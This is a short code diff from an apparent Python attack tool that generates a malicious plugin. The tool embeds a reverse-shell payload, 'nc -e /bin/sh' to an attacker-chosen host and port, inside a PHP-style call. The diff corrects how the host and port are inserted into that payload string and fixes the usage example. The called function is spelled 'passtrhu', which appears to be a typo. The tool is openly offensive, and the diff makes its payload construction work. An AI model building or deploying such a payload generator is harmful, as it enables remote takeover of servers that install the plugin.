@@ -16,9 +16,9 @@ import os, random, sys, zipfile, subprocess, requests
 
 try:
 
-	LHOST = 'LHOST=' + str(sys.argv[1])
-	LPORT = 'LPORT=' + str(sys.argv[2])
-	PAYLOAD = 'passtrhu("nc -e /bin/sh ' + LHOST + ' ' + LPORT + '");'
+	LHOST = str(sys.argv[1])
+	LPORT = str(sys.argv[2])
+	PAYLOAD = 'passtrhu("nc -e /bin/sh %s %s");' % (LHOST, LPORT)
 
 except IndexError:
 
@@ -30,7 +30,7 @@ except IndexError:
 	print "                         |_|"
 	print '\n'
 	print "Usage: %s [LHOST] [LPORT]" % sys.argv[0]
-	print "Example: %s 192.168.0.6 8888 Y" % sys.argv[0]
+	print "Example: %s 192.168.0.6 8888" % sys.argv[0]
 	sys.exit()
 
 def generate_plugin(LHOST, LPORT, PAYLOAD):
